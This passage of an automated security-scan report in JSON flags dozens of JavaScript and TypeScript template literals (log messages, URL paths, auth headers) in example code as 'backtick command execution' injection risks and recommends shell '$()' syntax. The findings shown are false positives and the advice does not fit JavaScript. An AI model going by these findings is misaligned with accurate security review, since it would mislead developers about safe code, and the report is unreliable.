        "evidence": "console.log(`  Tournament: ${await tournament.getScore('player1')} (Rank ${await tournament.getRank('player1') + 1})`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 321,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${results1.length} results`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 323,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${r.score.toFixed(2)}] ${r.name} - $${r.price}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 329,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${suggestions.length} suggestions`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 331,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${s.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 337,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${faceted.results.length} results`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 347,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${boosted.length} results`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 349,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${r.score.toFixed(2)}] ${r.name}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 355,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Page 1: ${page1.results.length} results, hasMore: ${page1.hasMore}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/database/elasticsearch-search/resources/examples/nodejs/search-service.js",
        "line_number": 359,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Page 2: ${page2.results.length} results`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 246,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Change ${i + 1}:`, change.change.message || '(no message)');",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 249,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nTotal changes: ${history.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 250,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Current counter: ${doc.counter}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 310,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 329,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 334,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 344,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 349,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  [${todo.done ? '\u2713' : ' '}] ${todo.text}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/javascript/automerge-example.js",
        "line_number": 379,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nSaved to ${bytes.length} bytes`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-authentication/resources/examples/typescript/jwt-auth-client.ts",
        "line_number": 58,
        "issue": "Backtick command execution",
        "evidence": "config.headers.Authorization = `Bearer ${token}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-authentication/resources/examples/typescript/jwt-auth-client.ts",
        "line_number": 83,
        "issue": "Backtick command execution",
        "evidence": "originalRequest.headers.Authorization = `Bearer ${token}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/api-authentication/resources/examples/typescript/jwt-auth-client.ts",
        "line_number": 154,
        "issue": "Backtick command execution",
        "evidence": "`${this.api.defaults.baseURL}/refresh`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 131,
        "issue": "Backtick command execution",
        "evidence": "const cacheKey = `${options.method}:${url}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 149,
        "issue": "Backtick command execution",
        "evidence": "headers['Authorization'] = `Bearer ${this.apiKey}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 287,
        "issue": "Backtick command execution",
        "evidence": "return this.request<User>(`/api/users/${userId}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 306,
        "issue": "Backtick command execution",
        "evidence": "return this.request<User>(`/api/users/${userId}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 316,
        "issue": "Backtick command execution",
        "evidence": "return this.request<User>(`/api/users/${userId}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/rest-api-design/resources/examples/typescript/api_client.ts",
        "line_number": 326,
        "issue": "Backtick command execution",
        "evidence": "return this.request<void>(`/api/users/${userId}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_server.ts",
        "line_number": 391,
        "issue": "Backtick command execution",
        "evidence": "message: `Post not found: ${id}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_server.ts",
        "line_number": 466,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\ud83d\ude80 GraphQL server ready at ${url}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
        "line_number": 270,
        "issue": "Backtick command execution",
        "evidence": "id: `temp-${Date.now()}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
        "line_number": 291,
        "issue": "Backtick command execution",
        "evidence": "cursor: `temp-${Date.now()}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
        "line_number": 388,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Found ${postsPage1.totalCount} total posts`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
        "line_number": 395,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Retrieved ${allPosts.length} posts`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/api/graphql-schema-design/resources/examples/typescript/graphql_client.ts",
        "line_number": 432,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  Update: ${posts.edges.length} posts in cache`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 273,
        "issue": "Backtick command execution",
        "evidence": ".get(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 313,
        "issue": "Backtick command execution",
        "evidence": "name: `User ${i}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 314,
        "issue": "Backtick command execution",
        "evidence": "email: `user${i}@example.com`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 359,
        "issue": "Backtick command execution",
        "evidence": ".patch(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 373,
        "issue": "Backtick command execution",
        "evidence": "const getResponse = await request(app).get(`/users/${userId}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 404,
        "issue": "Backtick command execution",
        "evidence": ".delete(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 409,
        "issue": "Backtick command execution",
        "evidence": ".get(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 435,
        "issue": "Backtick command execution",
        "evidence": ".get(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 442,
        "issue": "Backtick command execution",
        "evidence": ".patch(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 453,
        "issue": "Backtick command execution",
        "evidence": ".delete(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 458,
        "issue": "Backtick command execution",
        "evidence": ".get(`/users/${userId}`)",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 485,
        "issue": "Backtick command execution",
        "evidence": "name: `User ${i}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/testing/integration-testing/resources/examples/typescript/test_api_integration.test.ts",
        "line_number": 486,
        "issue": "Backtick command execution",
        "evidence": "email: `user${i}@perf.com`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 49,
        "issue": "Backtick command execution",
        "evidence": "let hstsValue = `max-age=${hstsMaxAge}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 194,
        "issue": "Backtick command execution",
        "evidence": "`script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 195,
        "issue": "Backtick command execution",
        "evidence": "`style-src 'self' 'nonce-${nonce}'`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 253,
        "issue": "Backtick command execution",
        "evidence": "*       <style nonce={nonce}>{`body { margin: 0; }`}</style>",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 418,
        "issue": "Backtick command execution",
        "evidence": "\\`script-src 'self' 'nonce-\\${nonce}' 'strict-dynamic'\\`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/security/security-headers/resources/examples/next-security-headers.ts",
        "line_number": 419,
        "issue": "Backtick command execution",
        "evidence": "\\`style-src 'self' 'nonce-\\${nonce}'\\`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
        "line_number": 220,
        "issue": "Backtick command execution",
        "evidence": "const orderId = `order-${Date.now()}`;",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
        "line_number": 368,
        "issue": "Backtick command execution",
        "evidence": "throw new Error(`Cannot fulfill order in status: ${order.status}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
        "line_number": 454,
        "issue": "Backtick command execution",
        "evidence": "console.log(`${SERVICE_NAME} listening on port ${PORT}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/distributed-tracing/resources/examples/typescript/otel_express_tracing.ts",
        "line_number": 455,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Traces will be sent to: ${OTLP_ENDPOINT}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/observability/metrics-instrumentation/resources/examples/typescript/express_metrics.ts",
        "line_number": 348,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Metrics endpoint: http://localhost:${PORT}/metrics`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/zustand-store.ts",
        "line_number": 146,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/users/${id}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/zustand-store.ts",
        "line_number": 157,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/users/${id}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/zustand-store.ts",
        "line_number": 177,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/users/${id}`, { method: 'DELETE' });",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 91,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/users/${id}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 97,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/posts?page=${page}&pageSize=${pageSize}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 103,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/posts/${id}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 109,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/posts/${postId}/comments`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 125,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/posts/${id}`, {",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/react-state-management/resources/examples/typescript/tanstack-query-hooks.ts",
        "line_number": 135,
        "issue": "Backtick command execution",
        "evidence": "const response = await fetch(`/api/posts/${id}`, { method: 'DELETE' });",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/robots.ts",
        "line_number": 78,
        "issue": "Backtick command execution",
        "evidence": "sitemap: `${baseUrl}/sitemap.xml`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/robots.ts",
        "line_number": 359,
        "issue": "Backtick command execution",
        "evidence": "sitemap: `https://${domain}/sitemap.xml`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/robots.ts",
        "line_number": 360,
        "issue": "Backtick command execution",
        "evidence": "host: `https://${domain}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 78,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 86,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/products/${product.id}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 101,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/about`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 107,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/contact`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 132,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/about`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 153,
        "issue": "Backtick command execution",
        "evidence": "const path = page ? `/${lang}/${page}` : `/${lang}`",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 156,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}${path}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 159,
        "issue": "Backtick command execution",
        "evidence": "priority: path === `/${lang}` ? 1 : 0.8,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 162,
        "issue": "Backtick command execution",
        "evidence": "languages.map(l => [l, `${baseUrl}/${l}${page ? `/${page}` : ''}`])",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 208,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}${path}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 238,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 259,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 268,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog?page=${page}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 294,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 313,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/sitemap-pages.xml`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 317,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/sitemap-posts.xml`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 321,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/sitemap-products.xml`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 401,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}${entry.path}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
        "line_number": 455,
        "issue": "Backtick command execution",
        "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/frontend/nextjs-seo/resources/examples/typescript/structured-data.ts",
        "line_number": 506,
        "issue": "Backtick command execution",
        "evidence": "urlTemplate: `${searchUrl}?q={search_term_string}`,",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 201,
        "issue": "Backtick command execution",
        "evidence": "throw new OrderError(`Product ${productId} not in order`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 375,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Order ${order.getOrderId()} created for customer ${order.getCustomerId()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 380,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Added ${order.getItems().length} items`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 381,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Total: $${order.getTotalAmount().toFixed(2)}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 385,
        "issue": "Backtick command execution",
        "evidence": "console.log(`Order submitted with status: ${order.getStatus()}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 389,
        "issue": "Backtick command execution",
        "evidence": "console.log(`\\nUncommitted events: ${events.length}`);",
        "recommendation": "Use $() syntax and validate inputs"
      },
      {
        "severity": "MEDIUM",
        "category": "Command Injection Risk",
        "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
        "line_number": 391,
        "issue": "Backtick command execution",
        "evidence": "console.log(`  ${i + 1}. ${event.eventType} (v${event.version})`);",
